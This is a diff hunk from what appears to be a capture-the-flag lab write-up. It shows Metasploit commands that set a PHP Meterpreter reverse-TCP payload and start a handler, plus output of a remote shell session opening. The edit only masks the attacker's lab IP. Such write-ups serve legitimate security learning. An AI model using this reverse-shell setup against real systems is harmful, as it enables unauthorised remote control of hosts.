@@ -98,8 +98,8 @@ msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
 msf5 exploit(multi/handler) > set LHOST tun0
 msf5 exploit(multi/handler) > exploit 
 
-[*] Started reverse TCP handler on 10.8.14.157:4444 
-[*] Meterpreter session 2 opened (10.8.14.157:4444 -> 10.10.223.78:34244) at 2020-11-09 12:29:21 -0500
+[*] Started reverse TCP handler on 10.*.**.***:4444 
+[*] Meterpreter session 2 opened (10.*.**.***:4444 -> 10.10.223.78:34244) at 2020-11-09 12:29:21 -0500
 ```
 
 ## Internal Enum :
